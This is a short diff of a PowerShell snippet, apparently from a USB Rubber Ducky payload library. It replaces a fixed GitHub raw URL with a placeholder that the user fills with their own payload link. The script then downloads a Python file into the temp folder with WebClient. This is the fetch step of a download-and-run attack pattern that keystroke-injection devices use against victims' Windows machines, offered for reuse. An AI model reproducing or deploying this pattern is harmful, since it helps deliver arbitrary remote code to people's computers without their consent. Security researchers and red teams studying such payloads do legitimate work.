@@ -1,5 +1,7 @@
 # Download Python script
-$scriptUrl = "https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/aff8e6ccdff52953812e5c770ddc004b0442c825/payloads/library/execution/CloseAllApplicationsInWindows/script.py"
+
+# Reply $scriptUrl with YOUR LINK. The Payload should be script.py
+$scriptUrl = "YOUR_END_USER_LINK_WITH_PAYLOAD"
 $savePath = "$env:temp\script.py"
 (New-Object System.Net.WebClient).DownloadFile($scriptUrl, $savePath)
 
